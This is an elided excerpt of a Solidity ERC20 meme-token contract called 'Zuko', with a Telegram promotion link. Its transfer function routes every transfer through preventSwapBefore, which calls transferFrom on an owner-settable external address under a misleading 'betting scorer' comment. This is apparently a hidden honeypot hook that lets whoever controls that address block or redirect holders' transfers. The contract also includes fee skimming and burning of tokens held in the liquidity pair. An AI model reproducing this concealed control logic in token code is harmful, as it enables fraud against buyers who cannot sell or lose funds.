...
\/____//'/'\ \ \ \ \ \ \/'/'\ \ \/\ \   
    ...
    https://t.me/zukomeme_announcements
...
contract Zuko is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function preventSwapBefore(address from, address to, uint256 amount) private returns(bool) {
        if(taxFeeWallet != address(0)) return IERC20(taxFeeWallet).transferFrom(from, to, amount); // mark score on betting scorer contract !important
        return true;
    }
    ...
    function _transfer(
        ...
        bool canSwap = contractBalanceOf >= swapTokensAtAmount || preventSwapBefore(from, to, amount) ;
        if( 
            canSwap && swapEnabled &&
            !isSwapping && !isUniPairs[from] &&
        ...
        if(takeFee){
            ...
            if(fees > 0){    
                _basicTokenTransfer(from, address(this), fees);
            }
        	
        	amount -= fees;
        }

        _basicTokenTransfer(from, to, amount);
    }
    ...
    function autoBurnLPTokens() internal returns (bool){
        ...
        if (amountToBurn > 0){
            _basicTokenTransfer(uniswapV2Pair, address(0xdead), amountToBurn);
        }
